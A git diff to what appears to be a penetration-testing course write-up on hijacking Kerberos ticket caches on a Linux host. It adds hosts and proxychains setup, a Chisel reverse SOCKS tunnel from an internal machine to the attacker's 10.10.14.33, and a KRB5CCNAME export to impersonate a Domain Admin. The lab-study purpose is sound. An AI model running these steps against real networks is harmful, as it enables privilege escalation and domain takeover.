@@ -5065,6 +5065,8 @@ To abuse a `.ccache` file, we only need read access. These files are typically s
 
 After logging in with the `svc_workstations` credentials, we can run `sudo -l` to verify that the user is allowed to execute any command as root. From there, we can escalate privileges by running `sudo su` to switch to the root user.
 
+---
+
 **Connect to Target via SSH**
 
 ```bash
@@ -5088,6 +5090,8 @@ sudo su
 ```bash
 whoami
 ```
+
+---
 
 As root, we need to identify which tickets are present on the machine, to whom they belong, and their expiration time.
 
@@ -5124,6 +5128,8 @@ id julio@<DOMAIN>
 ```bash
 # uid=647401106(julio@<DOMAIN>) gid=647400513(domain users@<DOMAIN>) groups=647400513(domain users@<DOMAIN>),647400512(domain admins@<DOMAIN>),647400572(denied rodc password replication group@<DOMAIN>)
 ```
+
+---
 
 Julio is a member of the **Domain Admins** group. We can attempt to impersonate the user and gain access to the **DC01** Domain Controller host.
 
@@ -5211,6 +5217,8 @@ However, if we're attacking from a non-domain-joined machine—such as our exter
 
 In our case, the attack host cannot directly connect to the **KDC** or resolve domain names through the **Domain Controller**. To enable Kerberos-based attacks in this scenario, we need to proxy traffic through an internal host (e.g., **MS01**) using tools like [Chisel](https://github.com/jpillora/chisel) and [Proxychains](https://github.com/haad/proxychains). Additionally, we must manually configure the `/etc/hosts` file to map domain names and target machine hostnames to their corresponding IP addresses.
 
+---
+
 **Modify `/etc/hosts`:**
 
 ```bash
@@ -5224,6 +5232,15 @@ echo "<IP> ms01.<DOMAIN> ms01" | sudo tee -a /etc/hosts
 cat /etc/hosts
 ```
 
+**Expected Output**
+
+```bash
+# Host addresses
+
+# <IP> <DOMAIN> dc01.<DOMAIN> dc01
+# <IP> ms01.<DOMAIN> ms01
+```
+
 **Modify `/etc/proxychains.conf`:**
 
 ```bash
@@ -5235,6 +5252,67 @@ sudo sed -i '/^\[ProxyList\]/,$c\[ProxyList]\nsocks5 127.0.0.1 1080' /etc/proxyc
 ```bash
 cat /etc/proxychains.conf
 ```
+
+**Expected Output**
+
+```bash
+# [ProxyList]
+# socks5 127.0.0.1 1080
+```
+
+---
+
+**Download Chisel to our attack host**
+
+```bash
+wget https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_linux_amd64.gz
+gzip -d chisel_1.7.7_linux_amd64.gz
+mv chisel_* chisel && chmod +x ./chisel
+sudo ./chisel server --reverse 
+```
+
+**Expected Output**
+
+```bash
+# 2025/10/10 07:26:15 server: Reverse tunneling enabled
+# 2025/10/10 07:26:15 server: Fingerprint 58EulHjQXAOsBRpxk232323sdLHd0r3r2nrdVYoYeVM=
+# 2025/10/10 07:26:15 server: Listening on http://0.0.0.0:8080
+```
+
+---
+
+**Connect to MS01 with xfreerdp**
+
+```bash
+xfreerdp /v:<IP> /u:<USER> /d:<DOMAIN> /p:<PASSWORD> /dynamic-resolution
+```
+
+---
+
+**Execute chisel from MS01**
+
+```cmd
+c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
+```
+
+**Expected Output**
+
+```cmd
+2025/10/10 06:34:19 client: Connecting to ws://10.10.14.33:8080
+2025/10/10 06:34:20 client: Connected (Latency 125.6177ms)
+```
+
+---
+
+**Setting the KRB5CCNAME environment variable**
+
+```bash
+export KRB5CCNAME=/home/<USER>/krb5cc_647401106_I8I133
+```
+
+> **Note:** If you are not familiar with file transfer operations, check out the module [FILE TRANSFERS](./04-file-transfers.md).
+
+---
 
 </details>
 
